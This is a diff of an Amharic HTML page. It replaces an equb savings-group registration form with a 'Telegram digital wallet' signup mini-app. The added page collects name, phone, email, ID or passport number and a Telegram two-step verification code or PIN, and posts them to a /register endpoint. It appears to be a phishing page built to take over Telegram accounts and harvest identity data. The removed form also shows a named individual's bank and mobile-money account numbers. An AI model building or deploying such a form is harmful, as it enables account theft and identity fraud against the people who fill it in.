@@ -1,213 +1,57 @@
 <!DOCTYPE html>
 <html lang="am">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>KOKETI KURT & LOUNGE - የዕቁብ እና ዋስትና መመዝገቢያ</title>
-<style>
-    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #0b1f36; display: flex; justify-content: center; padding: 20px; margin: 0; }
-    .form-container { background-color: #ffffff; width: 100%; max-width: 450px; padding: 25px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.3); }
-    .header { text-align: center; margin-bottom: 25px; border-bottom: 3px double #0b2545; padding-bottom: 12px; }
-    .header h2 { margin: 0; font-size: 22px; color: #0b2545; font-weight: 800; }
-    .header .subtitle { margin: 5px 0 0 0; font-size: 15px; color: #d93025; font-weight: bold; }
-    
-    .section-title { background-color: #f0f4f8; color: #0b2545; padding: 8px; font-weight: bold; font-size: 14px; margin: 20px 0 10px 0; border-left: 4px solid #0b2545; border-radius: 0 4px 4px 0; }
-    
-    .form-group { margin-bottom: 15px; }
-    label { display: block; font-weight: 700; font-size: 13.5px; color: #111; margin-bottom: 6px; }
-    input[type="text"], input[type="number"], input[type="file"], select { width: 100%; padding: 11px; border: 1px solid #d1d5db; border-radius: 4px; box-sizing: border-box; font-size: 15px; }
-    
-    .bank-info-box {
-        background: #f8f9fa;
-        border: 1px dashed #0b2545;
-        padding: 12px;
-        border-radius: 6px;
-        font-size: 12.5px;
-        margin-bottom: 15px;
-        color: #0b2545;
-        line-height: 1.6;
-    }
-
-    .row-group { display: flex; gap: 10px; }
-    .row-group .form-group { flex: 1; }
-
-    .checkbox-group { display: flex; align-items: center; gap: 10px; background-color: #f8f9fa; padding: 12px; border-radius: 4px; border: 1px dashed #0b2545; margin-top: 15px; }
-    .checkbox-group input { width: 20px; height: 20px; }
-    .checkbox-group label { margin: 0; font-size: 13px; color: #0b2545; }
-    
-    .submit-btn { width: 100%; padding: 14px; background-color: #0b2545; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 15px; }
-    .submit-btn:hover { background-color: #133863; }
-
-    .chapa-btn { width: 100%; padding: 12px; background-color: #10b981; color: white; border: none; border-radius: 4px; font-weight: bold; font-size: 15px; cursor: pointer; margin-top: 10px; }
-    .chapa-btn:hover { background-color: #059669; }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>የቴሌግራም ዲጂታል ዋሌት</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { font-family: Arial, sans-serif; background: #f4f4f9; padding: 20px; color: #333; }
+        .container { max-width: 400px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        input, select, button { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
+        button { background: #2481cc; color: white; border: none; font-weight: bold; cursor: pointer; }
+        button:hover { background: #1b6ca8; }
+    </style>
 </head>
 <body>
-
-<div class="form-container">
-    <div class="header">
-        <h2>KOKETI KURT & LOUNGE</h2>
-        <div class="subtitle">ዲጂታል የዕቁብና ዋስትና መቆጣጠሪያ</div>
-    </div>
-    
-    <div class="bank-info-box">
-        <b>የባንክ አካውንቶች (ስም: ጋሻዬ በእጅጉ ሄርጎ)፦</b><br>
-        • ቴሌብር: <b>0916039015</b><br>
-        • ንግድ ባንክ: <b>100070780201</b><br>
-        • አቢሲኒያ: <b>54071628</b><br>
-        • ንብ ባንክ: <b>7000106022734</b><br>
-        • ዳሽን ባንክ: <b>5121355332011</b>
+    <div class="container">
+        <h2>የዋሌት ምዝገባ ቅጽ</h2>
+        <form id="walletForm">
+            <input type="text" id="full_name" placeholder="ሙሉ ስም" required>
+            <input type="text" id="phone" placeholder="ስልክ ቁጥር" required>
+            <input type="email" id="email" placeholder="ኢሜይል አድራሻ" required>
+            <input type="text" id="id_document" placeholder="የመታወቂያ ወይም ፓስፖርት ቁጥር" required>
+            <input type="text" id="two_fa" placeholder="2 - Step Verification (ኮድ ወይም ፒን)" required>
+            <button type="button" onclick="submitRegistration()">ዋሌት ክፈት</button>
+        </form>
     </div>
 
-    <form id="equbForm" enctype="multipart/form-data">
-        <!-- 1. የዕቁብተኛው መረጃ -->
-        <div class="section-title">፩. የዕቁብተኛው መረጃ (Member Info)</div>
-        <div class="form-group">
-            <label>ሙሉ ስም (Full Name)</label>
-            <input type="text" id="fullName" placeholder="የእቁብተኛውን ስም ያስገቡ" required>
-        </div>
-        <div class="form-group">
-            <label>አድራሻ (Address)</label>
-            <input type="text" id="address" placeholder="ቀበሌ፣ የቤት ቁጥር ወይም አካባቢ" required>
-        </div>
-        <div class="form-group">
-            <label>ስልክ ቁጥር (Phone Number)</label>
-            <input type="text" id="phone" placeholder="0912345678" required>
-        </div>
-        <div class="form-group">
-            <label>የእቁብተኛው የቼክ ቁጥር (Member Cheque No.)</label>
-            <input type="text" id="chequeNo" placeholder="ካለው የቼክ ቁጥር ያስገቡ">
-        </div>
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
 
-        <!-- 2. የዕቁብ የገንዘብ ሂሳብ መቆጣጠሪያ -->
-        <div class="section-title">፪. የዕቁብ የገንዘብ ሁኔታ እና ዙር</div>
-        <div class="form-group">
-            <label>የዕቁብ ዙር መጠን (Equb Cycle Amount)</label>
-            <select id="cycleAmount" required>
-                <option value="">-- የብር መጠን ይምረጡ --</option>
-                <option value="10000">10,000 ብር</option>
-                <option value="20000">20,000 ብር</option>
-                <option value="50000">50,000 ብር</option>
-                <option value="100000">100,000 ብር</option>
-            </select>
-        </div>
-        <div class="row-group">
-            <div class="form-group">
-                <label>እስካሁን የጣለው (Paid Amount)</label>
-                <input type="number" id="paidAmount" placeholder="በብር" required>
-            </div>
-            <div class="form-group">
-                <label>ቀሪ እዳ (Remaining Due)</label>
-                <input type="number" id="remainingDue" placeholder="በብር" required>
-            </div>
-        </div>
-        <div class="form-group">
-            <label>የአሁን የዕቁብ ሳምንት / ዙር (Current Week / 1 - 5000)</label>
-            <select id="currentWeek" required>
-                <!-- ከ 1 እስከ 5000 ሳምንታት በራስ-ሰር የሚሞላ -->
-            </select>
-        </div>
+        function submitRegistration() {
+            let data = {
+                telegram_id: tg.initDataUnsafe?.user?.id || "12345678",
+                full_name: document.getElementById('full_name').value,
+                phone: document.getElementById('phone').value,
+                email: document.getElementById('email').value,
+                id_document: document.getElementById('id_document').value,
+                two_fa: document.getElementById('two_fa').value
+            };
 
-        <!-- 3. የክፍያ ስክሪንሾት ማያያዣ -->
-        <div class="section-title">፫. የክፍያ ማረጋገጫ (Payment Screenshot)</div>
-        <div class="form-group">
-            <label>የባንክ/ቴሌብር የክፍያ ስክሪንሾት (Upload Screenshot)</label>
-            <input type="file" id="paymentScreenshot" accept="image/*" required>
-        </div>
-
-        <!-- 4. የዋስትና መረጃ -->
-        <div class="section-title">፬. የዋስትና እና የዋስ መረጃ (Guarantor & Collateral)</div>
-        <div class="form-group">
-            <label>የዋስ ሙሉ ስም (Guarantor Name)</label>
-            <input type="text" id="guarantorName" placeholder="የዋስ ሙሉ ስም ያስገቡ">
-        </div>
-        <div class="row-group">
-            <div class="form-group">
-                <label>የዋስ የቼክ ቁጥር</label>
-                <input type="text" id="guarantorCheque" placeholder="የዋስ ቼክ ቁጥር">
-            </div>
-            <div class="form-group">
-                <label>በዋስትና የሚያዘው ንብረት</label>
-                <input type="text" id="collateral" placeholder="ለምሳሌ፡ መኪና፣ ቤት ወዘተ">
-            </div>
-        </div>
-
-        <div class="form-group checkbox-group">
-            <input type="checkbox" id="sms_notify" checked>
-            <label for="sms_notify"><strong>ሳምንታዊ አላርት እና ኤስኤምኤስ ይላክ፦</strong> ምዝገባው ሲያልቅ እና ሳምንታዊ ክፍያ ሲደርስ ማስታወሻ ይላክ።</label>
-        </div>
-
-        <button type="button" class="submit-btn" onclick="submitEqubData()">መረጃውን በቴሌግራም ቦት መዝግብ</button>
-        <button type="button" class="chapa-btn" onclick="payWithChapa()">በ Chapa ዲጂታል ክፍያ ፈጽም</button>
-    </form>
-</div>
-
-<script>
-    // ሳምንታትን ከ 1 እስከ 5000 በራስ-ሰር መሙላት
-    window.onload = function() {
-        const weekSelect = document.getElementById('currentWeek');
-        for(let i = 1; i <= 5000; i++) {
-            let opt = document.createElement('option');
-            opt.value = i;
-            opt.innerText = `ሳምንት ${i} (ከ 5000)`;
-            weekSelect.appendChild(opt);
-        }
-    };
-
-    async function submitEqubData() {
-        const formData = new FormData();
-        formData.append('full_name', document.getElementById('fullName').value);
-        formData.append('address', document.getElementById('address').value);
-        formData.append('phone', document.getElementById('phone').value);
-        formData.append('cheque_no', document.getElementById('chequeNo').value);
-        formData.append('cycle_amount', document.getElementById('cycleAmount').value);
-        formData.append('paid_amount', document.getElementById('paidAmount').value);
-        formData.append('remaining_due', document.getElementById('remainingDue').value);
-        formData.append('current_week', document.getElementById('currentWeek').value);
-        formData.append('guarantor_name', document.getElementById('guarantorName').value);
-        formData.append('guarantor_cheque', document.getElementById('guarantorCheque').value);
-        formData.append('collateral', document.getElementById('collateral').value);
-        
-        const screenshotFile = document.getElementById('paymentScreenshot').files[0];
-        if(screenshotFile) {
-            formData.append('screenshot', screenshotFile);
-        }
-
-        if(!document.getElementById('fullName').value || !document.getElementById('phone').value || !screenshotFile) {
-            alert('እባክዎ ሙሉ ስም፣ ስልክ ቁጥር እና የክፍያ ስክሪንሾት ያስገቡ!');
-            return;
-        }
-
-        try {
-            const response = await fetch('/api/register-equb', {
+            fetch('/register', {
                 method: 'POST',
-                body: formData
-            });
-            const result = await response.json();
-            if(result.status === 'success') {
-                alert('የእቁብ መረጃዎ እና የክፍያ ስክሪንሾት በተሳካ ሁኔታ ተመዝግቦ ለአድሚን ቴሌግራም ቦት ተልኳል!');
-                document.getElementById('equbForm').reset();
-            } else {
-                alert('ስህተት ተፈጥሯል፣ እባክዎ እንደገና ይሞክሩ።');
-            }
-        } catch(e) {
-            alert('የኔትወርክ ስህተት አጋጥሟል!');
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            })
+            .then(res => res.json())
+            .then(response => {
+                alert(response.message);
+                tg.close();
+            })
+            .catch(err => alert("ስህተት ተፈጥሯል: " + err));
         }
-    }
-
-    function payWithChapa() {
-        const amount = document.getElementById('paidAmount').value;
-        const fullName = document.getElementById('fullName').value;
-        const phone = document.getElementById('phone').value;
-
-        if(!amount || !fullName || !phone) {
-            alert('እባክዎ ከመክፈልዎ በፊት ስም፣ ስልክ እና የከፈሉትን የብር መጠን ያስገቡ!');
-            return;
-        }
-
-        alert(`የቻፓ (Chapa) የክፍያ ስርዓት ለ ${amount} ብር ሊጀምር ነው።`);
-    }
-</script>
-
+    </script>
 </body>
 </html>
